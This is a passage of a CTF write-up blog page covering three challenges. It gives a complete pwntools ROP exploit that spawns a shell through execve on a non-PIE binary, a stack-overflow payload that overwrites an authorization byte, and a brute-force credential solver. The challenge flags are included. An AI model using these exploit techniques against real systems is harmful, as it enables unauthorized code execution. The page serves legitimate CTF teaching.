+                                        <p>Moving to the next challenge, we are given a Linux ELF 64-bit LSB binary executable. The challenge is about buffer overflow and ROP (return-oriented programming) in a CLI-based note manager app. The binary shows a simple menu that lets you create, view, list, and read admin notes. The notes themselves are stored in a fixed writable data area. The program will accepts user input for titles and contents, and there is also a separate Admin menu protected by a password. Based on the binary security of this challenge, the NX is enabled (so injected shellcode is not usable), the binary is not PIE (code and function addresses are fixed), and there is no stack canary in the vulnerable input path (so saved return address is overwritable). </p>
+
+                                        <p>In this case, because our code and gadgets stored at predictable addresses and NX prevents code execution on the stack, we can craft a ROP chain to pivot execution to the desired syscall sequence. Since the app binary is not PIE and there is no stack canary, our input can overwrite the saved return address and redirect execution to gadgets inside the binary. In other words, our goal is to either spawn a shell via <code>ret2libc</code> or making a system call (syscall) using C function such as <code>execve</code>. You can refer to the <a href="https://github.com/W-zrd/Nonstop-PWN-Reverse/blob/main/binary-exploitation/README.md#you-know-0xdiablos" target="_blank"><u>following link</u></a> for the basic explanation of Buffer Overflow vulnerability.</p>
+
+                                        <div class="d-flex align-items-center my-2">
+                                            <img class="" src="assets/imgs/blog/blog-4/13.png" alt="" />
+                                        </div>
+
+                                        <p>The most robust exploitation for this challenge is to write the string <code>/bin/sh\x00</code> into the writable notes area using the Create functionality and then builds a ROP chain that sets registers for an <code>execve</code> function and triggers syscall. The ret2libc approach would also worked as some participants tried it and successfully got the flag using this method. But ret2libc depends on leaking the address of puts and selecting the correct libc binary for the target because remote environments may use different libc versions. The syscall approach avoids those barrier by using gadgets/functions which present in the binary. Since the binary is not PIE and the notes array address is fixed, we get deterministic exploitation.</p>
+
+                                        <h5>Solution</h5>
+
+                                        <div class="d-flex align-items-center my-2">
+                                            <img class="" src="assets/imgs/blog/blog-4/14.png" alt="" />
+                                        </div>
+
+                                        <p>The vulnerable part of the challenge is in the Admin function. The Admin routine reads user input into a local stack buffer allocated for the password while the buffer is only 0x10 (16) bytes long. It will accepts far more input from the user which will cause the data after those 16 bytes to overwrite return address. Once the function returns, the execution will jump to our controlled value to spawn a shell and get the flag. For example, there is <code>path</code> function in the binary that will open the flag locally. In the following image, we manipulate the return address to points to a function that stores the local flag. To understand how does Buffer Overflow works, you can see the image below.</p>
+
+                                        <div class="d-flex align-items-center my-2">
+                                            <img class="" src="assets/imgs/blog/blog-4/15.png" alt="" />
+                                        </div>
+
+                                        <p>But instead of writing to the <code>path</code> function address, our goal is to open the flag on the server using <code>execve</code> syscall. With the same logic as the previous example, write <code>/bin/sh\x00</code> string into a note Title and Content. This ensures <code>/bin/sh</code> is present somewhere in writable memory we control. Second, Select the Admin menu option which prompts for a password and then fill it with the offset. Since the function saves the base pointer (8 bytes) above password buffer, overwriting the saved return pointer requires 16 + 8 = 24 bytes of filler, and that is our offset.</p>
+
+                                        <p>The rest of the step is about crafting our ROP chain exploit. We need to enumerate gadgets/functions inside the binary that is useful for calling the syscall. You can use ropper, ropgadget, or objdump to do this. For example, The following function addresses can be useful for our exploit.</p>
+
+                                        <div class="code-container">
+                                            <div class="code-content">
+                                                <div class="code-controls">
+                                                    <div class="code-language">
+                                                        <i class="ri-code-s-slash-line" style="font-size: 0.6rem;"></i>
+                                                        <span>Python</span>
+                                                    </div>
+                                                    <button class="copy-btn" onclick="copyCode(this)">
+                                                        <i class="ri-file-copy-line" style="font-size: 0.6rem;"></i>
+                                                        <span>Copy</span>
+                                                    </button>
+                                                </div>
+                                                <pre><code class="language-python">objdump -d chall | egrep -n "pop_rdi|pop_rax|pop_rsi|pop_rdx|syscall"
+275:0000000000401359 pop_rdi:
+279:000000000040135b pop_rsi:
+283:000000000040135d pop_rdx:
+287:000000000040135f pop_rax:
+291:0000000000401361 pop_rdx_rbx:
+296:0000000000401364 syscall_gadget:
+</code></pre>
+                                            </div>
+                                        </div>
+
+                                        
+                                        <p>The payload begins by overflowing the stack frame up to the saved return address with 24 offset as we calculate earlier. From this, we can control the return address of the program immediately after the stack padding. The next entry is <code>p64(pop_rax)</code> which is a function address that pop values from the stack into registers and return.</p>
+
+                                        <div class="code-container">
+                                            <div class="code-content">
+                                                <div class="code-controls">
+                                                    <div class="code-language">
+                                                        <i class="ri-code-s-slash-line" style="font-size: 0.6rem;"></i>
+                                                        <span>Python</span>
+                                                    </div>
+                                                    <button class="copy-btn" onclick="copyCode(this)">
+                                                        <i class="ri-file-copy-line" style="font-size: 0.6rem;"></i>
+                                                        <span>Copy</span>
+                                                    </button>
+                                                </div>
+                                                <pre><code class="language-python">payload = flat([
+    b'A' * 24,
+    p64(pop_rax),
+    p64(0x59),
+    p64(pop_rdi),
+    p64(notes_addr),
+    p64(pop_rsi),
+    p64(0x0),
+    p64(pop_rdx),
+    p64(0x0),
+    p64(syscall),
+])
+</code></pre>
+                                            </div>
+                                        </div>
+
+                                        <p>After that, we need to set the <code>rax</code> register to <code>59</code> which is the syscall number for <code>execve</code> in Linux x86_64 architecture. Dont forget to set rdi to point at the <code>/bin/sh</code> string that was previously written into the program, by using <code>p64(pop_rdi); p64(notes_addr)</code>. By writing this, it means that we set <code>/bin/sh</code> as the first argument to execve function. The rest of the ROP chain is just to fill <code>execve</code> arguments. You can refer to <a href="https://linux.die.net/man/2/execve" target="_blank"><u>this link</u></a> for more information about the <code>execve</code> system call.</p>
+
+                                        <div class="code-container">
+                                            <div class="code-content">
+                                                <div class="code-controls">
+                                                    <div class="code-language">
+                                                        <i class="ri-code-s-slash-line" style="font-size: 0.6rem;"></i>
+                                                        <span>Python</span>
+                                                    </div>
+                                                    <button class="copy-btn" onclick="copyCode(this)">
+                                                        <i class="ri-file-copy-line" style="font-size: 0.6rem;"></i>
+                                                        <span>Copy</span>
+                                                    </button>
+                                                </div>
+                                                <pre><code class="language-python">#!/usr/bin/env python3
+from pwn import *
+
+context.log_level = 'debug'
+elf = ELF('./chall')
+p = process('./chall')
+notes_addr = elf.symbols['notes']
+
+offset = 24
+pop_rax = 0x40135f
+pop_rdi = 0x401359
+pop_rsi = 0x40135b
+pop_rdx = 0x40135d
+syscall = 0x401364
+
+p.sendlineafter(b'> ', b'1')
+p.sendlineafter(b'Title: ', b'/bin/sh\x00')
+p.sendlineafter(b'Content: ', b'/bin/sh\x00')
+
+p.sendlineafter(b'> ', b'4')
+payload = flat([
+    b'A' * offset,
+    p64(pop_rax),
+    p64(59),
+    p64(pop_rdi),
+    p64(notes_addr),
+    p64(pop_rsi),
+    p64(0),
+    p64(pop_rdx),
+    p64(0),
+    p64(syscall),
+])
+p.sendlineafter(b'Password: ', payload)
+
+p.interactive()
+</code></pre>
+                                            </div>
+                                        </div>
+
+                                        <div class="d-flex align-items-center my-2">
+                                            <img class="" src="assets/imgs/blog/blog-4/16.png" alt="" />
+                                        </div>
+                                    </div>
+                             
+                                </div>
+
+                                <div class="mt-5">
+                                    
+                                    
+
+                                    <div class="mt-4">
+                                        <h4 id="ncurse">4. Ncurse (Easy)</h4>
+                                        
+                                        <div class="challenge-summary">
+                                            <div class="summary-grid">
+                                                <div class="summary-item">
+                                                    <p class="summary-label">Difficulty</p>
+                                                    <span class="difficulty-easy">Easy</span>
+                                                </div>
+                                                <div class="summary-item">
+                                                    <p class="summary-label">Category</p>
+                                                    <p class="summary-value">Binary Exploitation</p>
+                                                </div>
+                                                <div class="summary-item">
+                                                    <p class="summary-label">Topic</p>
+                                                    <p class="summary-value">Buffer Overflow</p>
+                                                </div>
+                                            </div>
+                                            <div class="flag-container">
+                                                <p class="flag-text">CBC{ncurs3_b1n4ry_3xpl01t4t1on_b0fb0f}</p>
+                                                <button class="flag-copy-btn" onclick="copyFlag(this)">
+                                                    <i class="ri-file-copy-line" style="font-size: 0.6rem;"></i>
+                                                    <span>Copy</span>
+                                                </button>
+                                    </div>
+                                    </div>
+                                        <div class="d-flex align-items-center my-2">
+                                            <img class="" src="assets/imgs/blog/blog-4/17.png" alt="" />
+                                        </div>
+                                        <p>In the next PWN challenge, we are presented with a small x86-64 ELF that implements a text-based (ncurses-like) menu. The program offers a few interactive options such as creating an entry for username, and reads user-supplied text into a fixed-size buffer on the stack. But, the program input does not properly enforce the buffer's boundary, so supplying more bytes than the buffer can hold, could overwrites adjacent stack data. In this challenge the overflow doesn't need to smash saved return addresses or build complex ROP chains. Instead, it corrupts a nearby authorization flag or byte checks stored on the stack. That makes the vulnerability is straightforward and so easy once the correct offset is known.</p>
+
+                                        <h5>Solution</h5>
+                                        <div class="d-flex align-items-center my-2">
+                                            <img class="" src="assets/imgs/blog/blog-4/18.png" alt="" />
+                                        </div>
+                                        <p>The "Enter your name" menu option reads user-controlled bytes into a stack buffer of fixed length, but the input routine does not enforce an upper bound. Because an authorization byte is laid out after that buffer in stack memory, writing past the buffer's end allows a one-byte overwrite of this flag. The solver's payload <code>'A'*68 + '\xff'</code> demonstrates the 68 offset bytes which will fill the buffer, and the <code>\xff</code> byte is used to pass the byte checks in the admin function.</p>
+                                        
+                                        <div class="code-container">
+                                            <div class="code-content">
+                                                <div class="code-controls">
+                                                    <div class="code-language">
+                                                        <i class="ri-code-s-slash-line" style="font-size: 0.6rem;"></i>
+                                                        <span>Python</span>
+                                                    </div>
+                                                    <button class="copy-btn" onclick="copyCode(this)">
+                                                        <i class="ri-file-copy-line" style="font-size: 0.6rem;"></i>
+                                                        <span>Copy</span>
+                                                    </button>
+                                                </div>
+                                                <pre><code class="language-python">from pwn import *
+
+p = process('./main', level='debug')
+p.send(b'1')
+payload = b'A'*68 + b'\xff'
+p.sendline(payload)
+p.send(b'2')
+print(p.recvall())
+</code></pre>
+                                            </div>
+                                        </div>
+                                        <div class="d-flex align-items-center my-2">
+                                            <img class="" src="assets/imgs/blog/blog-4/19.png" alt="" />
+                                        </div>
+                                        <p></p>
+                                    </div>
+
+                                    <div class="mt-4">
+                                        <h4 id="bl1zzard">5. Bl1zzard (Easy)</h4>
+                                        
+                                        <div class="challenge-summary">
+                                            <div class="summary-grid">
+                                                <div class="summary-item">
+                                                    <p class="summary-label">Difficulty</p>
+                                                    <span class="difficulty-easy">Easy</span>
+                                                </div>
+                                                <div class="summary-item">
+                                                    <p class="summary-label">Category</p>
+                                                    <p class="summary-value">Web Exploitation</p>
+                                                </div>
+                                                <div class="summary-item">
+                                                    <p class="summary-label">Topic</p>
+                                                    <p class="summary-value">Web Reversing Logic</p>
+                                                </div>
+                                            </div>
+                                            <div class="flag-container">
+                                                <p class="flag-text">CBC{bl1zzard_web_reversing_logic_2024}</p>
+                                                <button class="flag-copy-btn" onclick="copyFlag(this)">
+                                                    <i class="ri-file-copy-line" style="font-size: 0.6rem;"></i>
+                                                    <span>Copy</span>
+                                                </button>
+                                            </div>
+                                        </div>
+                                        
+                                        <p>This challenge was intended to be a web assembly and reverse engineering problem case. But the author didnt have time to build the code and logic :( Anyway, here is the solver script</p>
+                                        <div class="code-container">
+                                            <div class="code-content">
+                                                <div class="code-controls">
+                                                    <div class="code-language">
+                                                        <i class="ri-code-s-slash-line" style="font-size: 0.6rem;"></i>
+                                                        <span>Python</span>
+                                                    </div>
+                                                    <button class="copy-btn" onclick="copyCode(this)">
+                                                        <i class="ri-file-copy-line" style="font-size: 0.6rem;"></i>
+                                                        <span>Copy</span>
+                                                    </button>
+                                                </div>
+                                                <pre><code class="language-python">import string
+import itertools
+import random
+from typing import List, Tuple, Optional
+
+MAGIC_PRIME = 0x1F2F3F4F
+VALIDATION_KEY = 0x41424344
+TIME_SEED = 1640995200
+
+def djb2_hash(s: str) -> int:
+    hash_val = 5381
+    for c in s:
+        hash_val = ((hash_val << 5) + hash_val + ord(c)) & 0xFFFFFFFF
+    return hash_val
+
+def fnv1a_hash(s: str) -> int:
+    hash_val = 2166136261
+    for c in s:
+        hash_val = (hash_val ^ ord(c)) & 0xFFFFFFFF
+        hash_val = (hash_val * 16777619) & 0xFFFFFFFF
+    return hash_val
+
+def combined_hash(s: str) -> int:
+    djb2 = djb2_hash(s)
+    fnv1a = fnv1a_hash(s)
+    
+    combined = djb2 ^ fnv1a
+    combined = ((combined << 13) | (combined >> 19)) & 0xFFFFFFFF
+    
+    return combined ^ MAGIC_PRIME
+
+def calculate_checksum(data: str) -> int:
+    checksum = 0
+    for i, c in enumerate(data):
+        checksum += ord(c) * (i + 1) * 17
+    return (checksum ^ (checksum >> 8) ^ (checksum >> 16)) & 0xFF
+
+def validate_username_format(username: str) -> bool:
+    if len(username) < 6 or len(username) > 10:
+        return False
+    
+    letter_count = sum(1 for c in username if c.isalpha())
+    digit_count = sum(1 for c in username if c.isdigit())
+    
+    if letter_count < 2 or digit_count < 1:
+        return False
+    
+    ascii_sum = sum(ord(c) for c in username)
+    if ascii_sum < 400 or ascii_sum > 800:
+        return False
+    
+    hash_val = combined_hash(username)
+    
+    if hash_val % 42 != 0:
+        return False
+    
+    if (hash_val & 0xFF) != 0x7E:
+        return False
+    
+    return True
+
+def generate_expected_password(username: str) -> int:
+    base_hash = combined_hash(username)
+    checksum = calculate_checksum(username)
+    transformed = base_hash ^ (checksum * 0x01010101)
+    transformed ^= TIME_SEED
+    transformed = (transformed * 0x41C64E6D + 0x3039) & 0xFFFFFFFF
+    transformed ^= VALIDATION_KEY
+    return (transformed % 999999) + 100000
+
+def validate_password_constraints(password: int) -> bool:
+    digit_sum = sum(int(d) for d in str(password))
+    if digit_sum % 7 != 0:
+        return False
+    
+    pwd_str = str(password)
+    if pwd_str == pwd_str[::-1]:
+        return False
+    
+    return True
+
+def verify_credentials(username: str, password: int) -> bool:
+    if not validate_username_format(username):
+        return False
+
+    expected_password = generate_expected_password(username)
+    if password != expected_password:
+        return False
+    
+    if not validate_password_constraints(password):
+        return False
+    
+    return True
+
+def generate_smart_candidates(count: int = 10000) -> List[str]:
+    candidates = []
+    
+    letters = string.ascii_letters
+    digits = string.digits
+    
+    print(f"Generating {count} smart candidate usernames...")
+    
+    for _ in range(count):
+        length = random.randint(6, 10)
+        
+        username_chars = []
+        
+        username_chars.extend(random.choices(letters, k=2))
+        username_chars.append(random.choice(digits))
+        
+        remaining = length - 3
+        for _ in range(remaining):
+            if random.random() < 0.7:
+                username_chars.append(random.choice(letters))
+            else:
+                username_chars.append(random.choice(digits))
+        
+        random.shuffle(username_chars)
+        candidate = ''.join(username_chars)
+        
+        ascii_sum = sum(ord(c) for c in candidate)
+        if 400 <= ascii_sum <= 800:
+            candidates.append(candidate)
+    
+    candidates = list(set(candidates))
+    print(f"Generated {len(candidates)} unique candidates")
+    return candidates
+
+def mathematical_analysis():
+    print("MATHEMATICAL CONSTRAINT ANALYSIS")
+    print("=" * 50)
+    
+    print("\nUsername Constraints:")
+    print("1. Length: 6-10 characters")
+    print("2. Composition: ≥2 letters, ≥1 digit")
+    print("3. ASCII sum: 400-800")
+    print("4. Combined hash % 42 = 0")
+    print("5. Combined hash & 0xFF = 0x7E")
+    
+    print("\nPassword Constraints:")
+    print("1. Range: 100000-999999")
+    print("2. Digit sum % 7 = 0")
+    print("3. Not a palindrome")
+    
+    print("\nProbability Analysis:")
+    print(f"Hash divisible by 42: 1 in 42 ({1/42*100:.2f}%)")
+    print(f"Hash pattern 0x7E: 1 in 256 ({1/256*100:.2f}%)")
+    print(f"Combined hash constraints: 1 in {42*256} ({1/(42*256)*100:.4f}%)")
+    print(f"Password digit sum constraint: ~1 in 7 ({1/7*100:.2f}%)")
+    
+    estimated_success_rate = 1/(42*256*7)
+    print(f"Overall estimated success rate: ~1 in {int(1/estimated_success_rate)} ({estimated_success_rate*100:.6f}%)")
+
+def brute_force_search(max_attempts: int = 50000) -> List[Tuple[str, int]]:
+    print(f"\nStarting brute force search (max {max_attempts:,} attempts)")
+    
+    solutions = []
+    candidates = generate_smart_candidates(max_attempts)
+    
+    for i, username in enumerate(candidates):
+        if i % 5000 == 0:
+            print(f"Progress: {i:,}/{len(candidates):,} ({i/len(candidates)*100:.1f}%)")
+        
+        if not validate_username_format(username):
+            continue
+        
+        try:
+            password = generate_expected_password(username)
+            
+            if verify_credentials(username, password):
+                solutions.append((username, password))
+                print(f"Found: '{username}' -> {password}")
+                
+                if len(solutions) >= 5:
+                    break
+                    
+        except Exception as e:
+            continue
+    
+    return solutions
+
+def analyze_solution(username: str, password: int):
+    print(f"\nDetail of: '{username}' -> {password}")
+    print("=" * 60)
+    
+    print(f"A. Username Analysis:")
+    print(f"   Length: {len(username)}")
+    print(f"   Letters: {sum(1 for c in username if c.isalpha())}")
+    print(f"   Digits: {sum(1 for c in username if c.isdigit())}")
+    print(f"   ASCII Sum: {sum(ord(c) for c in username)}")
+    
+    djb2 = djb2_hash(username)
+    fnv1a = fnv1a_hash(username)
+    combined = combined_hash(username)
+    checksum = calculate_checksum(username)
+    
+    print(f"\nB. Hash Analysis:")
+    print(f"   DJB2: 0x{djb2:08x} ({djb2})")
+    print(f"   FNV1A: 0x{fnv1a:08x} ({fnv1a})")
+    print(f"   Combined: 0x{combined:08x} ({combined})")
+    print(f"   Combined % 42: {combined % 42}")
+    print(f"   Combined & 0xFF: 0x{combined & 0xFF:02x}")
+    print(f"   Checksum: {checksum}")
+    
+    digit_sum = sum(int(d) for d in str(password))
+    is_palindrome = str(password) == str(password)[::-1]
+    
+    print(f"\nC. Password Analysis:")
+    print(f"   Password: {password}")
+    print(f"   Digit Sum: {digit_sum} (% 7 = {digit_sum % 7})")
+    print(f"   Is Palindrome: {is_palindrome}")
+    print(f"   Range Check: {100000 <= password <= 999999}")
+
+def create_verification_script(solutions: List[Tuple[str, int]]):
+    print(f"\nVERIFICATION INSTRUCTIONS")
+    print("=" * 30)
+    
+    for i, (username, password) in enumerate(solutions):
+        print(f"   Solution {i+1}:")
+        print(f"   └── Username: {username}")
+        print(f"   └── Password: {password}")
+        print()
+
+def main():
+    mathematical_analysis()
+    solutions = brute_force_search()
+    
+    if solutions:
+        print(f"\Found {len(solutions)} valid combinations!")
+        
+        for i, (username, password) in enumerate(solutions):
+            analyze_solution(username, password)
+        
+        create_verification_script(solutions)
+        
+    else:
+        print("\nNo solutions found.")
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                            </div>
+                            <div class="col-lg-4">
+                                <div class="sticky-sidebar">
+                                    
+                                    <div class="bg-primary bg-opacity-10 border border-primary border-opacity-25 rounded-4 p-4">
+                                        <div class="d-flex align-items-center mb-3">
+                                            <i class="ri-list-check-2 fs-5 text-primary me-2"></i>
+                                            <h6 class="mb-0 text-primary">Table of Contents</h6>
+                                        </div>
+                                        <ol class="list-unstyled mb-0">
+                                            <li class="mb-2">
+                                                <a href="#bl1tz" class="text-decoration-none d-flex align-items-center p-2 rounded-3 hover-bg-opacity-10 transition-all toc-link">
+                                                    <i class="ri-arrow-right-s-line text-primary me-2 transition-all"></i>
+                                                    <span><strong>Bl1tz</strong> <span class="text-muted">(Hard)</span></span>
+                                                </a>
+                                            </li>
+                                            <li class="mb-2">
+                                                <a href="#e-market" class="text-decoration-none d-flex align-items-center p-2 rounded-3 hover-bg-opacity-10 transition-all toc-link">
+                                                    <i class="ri-arrow-right-s-line text-primary me-2 transition-all"></i>
+                                                    <span><strong>E-Market</strong> <span class="text-muted">(Hard)</span></span>
+                                                </a>
+                                            </li>
+                                            <li class="mb-2">
+                                                <a href="#starting-point" class="text-decoration-none d-flex align-items-center p-2 rounded-3 hover-bg-opacity-10 transition-all toc-link">
+                                                    <i class="ri-arrow-right-s-line text-primary me-2 transition-all"></i>
+                                                    <span><strong>Starting Point</strong> <span class="text-muted">(Medium)</span></span>
+                                                </a>
+                                            </li>
+                                            <li class="mb-2">
+                                                <a href="#ncurse" class="text-decoration-none d-flex align-items-center p-2 rounded-3 hover-bg-opacity-10 transition-all toc-link">
+                                                    <i class="ri-arrow-right-s-line text-primary me-2 transition-all"></i>
+                                                    <span><strong>Ncurse</strong> <span class="text-muted">(Easy)</span></span>
+                                                </a>
+                                            </li>
+                                            <li class="mb-2">
+                                                <a href="#bl1zzard" class="text-decoration-none d-flex align-items-center p-2 rounded-3 hover-bg-opacity-10 transition-all toc-link">
+                                                    <i class="ri-arrow-right-s-line text-primary me-2 transition-all"></i>
+                                                    <span><strong>Bl1zzard</strong> <span class="text-muted">(Easy)</span></span>
+                                                </a>
+                                            </li>
+                                        </ol>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <!-- blog list -->
+        <section class="section-blog-list">
+            <div class="container border-top pt-80 pb-80">
+                <div class="row">
+                    <div class="d-md-flex align-items-center">
+                        <h1 class="text-300">Related posts</h1>
+                        <a href="" class="btn btn-gradient ms-auto">
+                            View more
+                            <i class="ri-arrow-right-line"></i>
+                        </a>
+                    </div>
+                </div>
+                <div class="row mt-8">
+                    <div class="col-lg-4">
+                        <div class="blog-card rounded-4 mb-lg-3 mb-md-5 mb-3">
+                            <div class="blog-card__image position-relative">
+                                <div class="zoom-img rounded-3 overflow-hidden">
+                                    <img class="w-100" src="https://i.pinimg.com/736x/10/21/d0/1021d087c521fe658a764b0ff3348d09.jpg" style="height: 250px; object-fit: cover;" alt="">
+                                    <a class="position-absolute bottom-0 start-0 m-3 text-white-keep btn btn-gradient fw-medium rounded-3 px-3 py-2" href="blog-1.html">Reverse Engineering</a>
+                                    <a href="blog-1.html" class="blog-card__link position-absolute top-50 start-50 translate-middle icon-md icon-shape bg-linear-1 rounded-circle">
+                                        <i class="ri-arrow-right-up-line text-dark"></i>
+                                    </a>
+                                </div>
+                            </div>
+                            <div class="blog-card__content position-relative text-center mt-4">
+                                <span class="blog-card__date fs-7">June 26, 2023 • 5 min read</span>
+                                <h5 class="blog-card__title">Reverse Engineering Fake Phishing SiCepat App</h5>
+                                <p class="blog-card__description fs-6">A brief security awareness & story about why you shouldn't trust stranger.</p>
+                                <a href="blog-1.html" class="link-overlay position-absolute top-0 start-0 w-100 h-100"></a>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-lg-4">
+                        <div class="blog-card rounded-4 mb-lg-3 mb-md-5 mb-3">
+                            <div class="blog-card__image position-relative">
+                                <div class="zoom-img rounded-3 overflow-hidden">
+                                    <img class="w-100" src="https://i.pinimg.com/736x/c9/c3/47/c9c347f07d38aa9c2ad85e73db0a4719.jpg" style="height: 250px; object-fit: cover;" alt="">
+                                    <a class="position-absolute bottom-0 start-0 m-3 text-white-keep btn btn-gradient fw-medium rounded-3 px-3 py-2" href="blog-3.html">Offensive Security</a>
+                                    <a href="blog-3.html" class="blog-card__link position-absolute top-50 start-50 translate-middle icon-md icon-shape bg-linear-1 rounded-circle">
+                                        <i class="ri-arrow-right-up-line text-dark"></i>
+                                    </a>
+                                </div>
+                            </div>
+                            <div class="blog-card__content position-relative text-center mt-4">
+                                <span class="blog-card__date fs-7">November 5, 2024 • 7 min read</span>
+                                <h5 class="blog-card__title">Cyber-breaker CTF (Attack Session) Solver Scripts & Documentation</h5>
+                                <p class="blog-card__description fs-6">Summary of all my findings over the past 3 years</p>
+                                <a href="blog-3.html" class="link-overlay position-absolute top-0 start-0 w-100 h-100"></a>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-lg-4">
+                        <div class="blog-card rounded-4 mb-lg-3 mb-md-5 mb-3">
+                            <div class="blog-card__image position-relative">
+                                <div class="zoom-img rounded-3 overflow-hidden">
+                                    <img class="w-100" src="assets/imgs/blog/blog-2/cover.jpg" style="height: 250px; object-fit: cover;" alt="">
+                                    <a class="position-absolute bottom-0 start-0 m-3 text-white-keep btn btn-gradient fw-medium rounded-3 px-3 py-2" href="blog-2.html">Offensive Security</a>
+                                    <a href="blog-2.html" class="blog-card__link position-absolute top-50 start-50 translate-middle icon-md icon-shape bg-linear-1 rounded-circle">
+                                        <i class="ri-arrow-right-up-line text-dark"></i>
+                                    </a>
+                                </div>
+                            </div>
+                            <div class="blog-card__content position-relative text-center mt-4">
+                                <span class="blog-card__date fs-7">December 17, 2024 • 6 min read</span>
+                                <h5 class="blog-card__title">How a Small Security Flaw Can Lead to Massive Data Breach</h5>
+                                <p class="blog-card__description fs-6">Everything Online Is Vulnerable. This is how Attackers Exploit SQLi to Expose Your Personal Information</p>
+                                <a href="blog-2.html" class="link-overlay position-absolute top-0 start-0 w-100 h-100"></a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+    </main>
+    <!-- prettier-ignore -->
+    <!-- Footer -->
+    <footer>
+        <div class="section-footer position-relative pt-60 pb-60 bg-secondary-1">
+            <div class="container position-relative z-1">
+                <div class="text-center">
+                    <a class="d-flex main-logo align-items-center d-inline-flex" href="index.html">
+                        <img src="assets/imgs/footer-1/logo.svg" alt="zelio" />
+                        <span class="fs-4 ms-2 text-white-keep">w333zard</span>
+                    </a>
+                    <div class="navigation d-none d-md-flex align-items-center justify-content-center flex-wrap gap-4 my-4">
+                        <a href="index.html" class="fs-5">
+                            Home
+                        </a>
+                        <a href="index.html#skills" class="fs-5">
+                            Skills
+                        </a>
+                        <a href="index.html#portfolio" class="fs-5">
+                            Portfolio
+                        </a>
+                        <a href="index.html#blog" class="fs-5">
+                            Blog
+                        </a>
+                        <a href="index.html#projects" class="fs-5">
+                            Projects
+                        </a>
+                        <a href="index.html#contact" class="fs-5">
+                            Contact
+                        </a>
+                    </div>
+                </div>
+                <div class="row text-center py-4">
+                    <span class="fs-6 text-white-keep">© 2024 All Rights Reserved by <span><a href="#" class="text-primary">w333zard</a></span>
+                </div>
+            </div>
+            <div class="position-absolute top-0 start-0 w-100 h-100 z-0" data-background="assets/imgs/footer-1/background.png "></div>
+        </div>
+    </footer>
+    <!-- Scroll top -->
+    <div class="btn-scroll-top @@style">
+        <svg class="progress-square svg-content" width="100%" height="100%" viewBox="0 0 40 40">
+            <path d="M8 1H32C35.866 1 39 4.13401 39 8V32C39 35.866 35.866 39 32 39H8C4.13401 39 1 35.866 1 32V8C1 4.13401 4.13401 1 8 1Z" />
+        </svg>
+    </div>
+
+    <!-- Libs JS -->
+    <script src="assets/js/vendors/bootstrap.bundle.min.js"></script>
+    <script src="assets/js/vendors/swiper-bundle.min.js"></script>
+    <script src="assets/js/vendors/aos.js"></script>
+    <script src="assets/js/vendors/odometer.min.js"></script>
+    <script src="assets/js/vendors/magnific-popup.min.js"></script>
+    
+    <!-- Theme JS -->
+    <script src="assets/js/main.js"></script>
+    
+    <!-- Blog-specific JavaScript -->
+    <script>
+        // Collapse / Expand code blocks
+        function toggleCode(toggleEl) {
+            const container = toggleEl.closest('.code-container');
+            const titleSpan = toggleEl.querySelector('.code-toggle-title span');
+            container.classList.toggle('collapsed');
+            const isCollapsed = container.classList.contains('collapsed');
+            if (titleSpan) {
+                const text = titleSpan.textContent;
+                titleSpan.textContent = text.replace(isCollapsed ? 'Hide code' : 'Show code', isCollapsed ? 'Show code' : 'Hide code');
+            }
+        }
+
+        // Copy to clipboard functionality
+        function copyCode(button) {
+            const codeContainer = button.closest('.code-container');
+            const codeElement = codeContainer.querySelector('code');
+            const codeText = codeElement.textContent;
+            
+            // Create a temporary textarea to copy the text
+            const tempTextarea = document.createElement('textarea');
+            tempTextarea.value = codeText;
+            document.body.appendChild(tempTextarea);
+            tempTextarea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextarea);
+            
+            // Update button appearance
+            const originalText = button.querySelector('span').textContent;
+            const originalIcon = button.querySelector('i').className;
+            
+            button.querySelector('span').textContent = 'Copied!';
+            button.querySelector('i').className = 'ri-check-line';
+            button.classList.add('copied');
+            
+            // Reset button after 2 seconds
+            setTimeout(() => {
+                button.querySelector('span').textContent = originalText;
+                button.querySelector('i').className = originalIcon;
+                button.classList.remove('copied');
+            }, 2000);
+        }
+        
+        // Initialize collapsible code blocks
+        document.addEventListener('DOMContentLoaded', () => {
+            document.querySelectorAll('.code-container').forEach(container => {
+                // Skip if already initialized
+                if (container.dataset.toggled === 'true') return;
+
+                const codeContent = container.querySelector('.code-content');
+                if (!codeContent) return;
+
+                // Determine language label
+                const codeEl = codeContent.querySelector('code');
+                let language = 'Code';
+                if (codeEl) {
+                    const match = (codeEl.className || '').match(/language-([\w-]+)/);
+                    if (match && match[1]) {
+                        language = match[1].charAt(0).toUpperCase() + match[1].slice(1);
+                    }
+                }
+
+                // Build toggle bar
+                const toggleBar = document.createElement('div');
+                toggleBar.className = 'code-toggle';
+                toggleBar.innerHTML = `
+                    <div class="code-toggle-title">
+                        <i class="ri-code-s-slash-line"></i>
+                        <span>${language} • Show code</span>
+                    </div>
+                    <div class="code-toggle-actions">
+                        <i class="ri-arrow-down-s-line toggle-icon"></i>
+                    </div>
+                `;
+                toggleBar.addEventListener('click', () => toggleCode(toggleBar));
+
+                // Insert toggle bar and collapse by default
+                container.insertBefore(toggleBar, codeContent);
+                container.classList.add('collapsed');
+                container.dataset.toggled = 'true';
+            });
+        });
+        
+        // Copy flag functionality
+        function copyFlag(button) {
+            const flagContainer = button.closest('.flag-container');
+            const flagText = flagContainer.querySelector('.flag-text').textContent;
+            
+            // Create a temporary textarea to copy the text
+            const tempTextarea = document.createElement('textarea');
+            tempTextarea.value = flagText;
+            document.body.appendChild(tempTextarea);
+            tempTextarea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextarea);
+            
+            // Update button appearance
+            const originalText = button.querySelector('span').textContent;
+            const originalIcon = button.querySelector('i').className;
+            
+            button.querySelector('span').textContent = 'Copied!';
+            button.querySelector('i').className = 'ri-check-line';
+            button.classList.add('copied');
+            
+            // Reset button after 2 seconds
+            setTimeout(() => {
+                button.querySelector('span').textContent = originalText;
+                button.querySelector('i').className = originalIcon;
+                button.classList.remove('copied');
+            }, 2000);
+        }
+        
+        // Smooth scrolling for anchor links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
